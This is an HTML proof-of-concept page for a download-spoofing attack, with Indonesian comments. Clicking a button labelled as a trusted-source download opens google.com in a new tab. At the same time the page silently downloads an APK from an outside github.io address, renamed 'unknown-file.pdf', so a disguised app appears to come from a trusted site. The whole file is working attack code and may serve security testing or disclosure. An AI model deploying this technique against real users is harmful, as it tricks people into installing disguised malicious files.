<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spoofing Download - Proof of Concept</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        text-align: center;
        margin-top: 50px;
      }
      button {
        padding: 10px 20px;
        font-size: 16px;
        cursor: pointer;
        background-color: #4CAF50;
        color: white;
        border: none;
        border-radius: 5px;
      }
    </style>
  </head>
  <body>
    <h2>Spoofing Download Test</h2>
    <p>Click the button below to simulate a download.</p>
    <button id="openTabButton">Download File from Trusted Source</button>

    <script>
      const openTabButton = document.getElementById('openTabButton');

      openTabButton.addEventListener('click', () => {
        // Membuka tab baru ke situs terpercaya (misalnya Google)
        window.open('https://www.google.com', '_blank');

        // Membuat elemen <a> untuk mendownload file yang tidak diketahui
        const link = document.createElement('a');
        link.href = 'https://ecdnts.del.github.io/test-apk/apple.apk'; // Ganti dengan URL file yang ingin diuji
        link.download = 'unknown-file.pdf';  // Nama file yang diunduh
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
      });
    </script>
  </body>
</html>
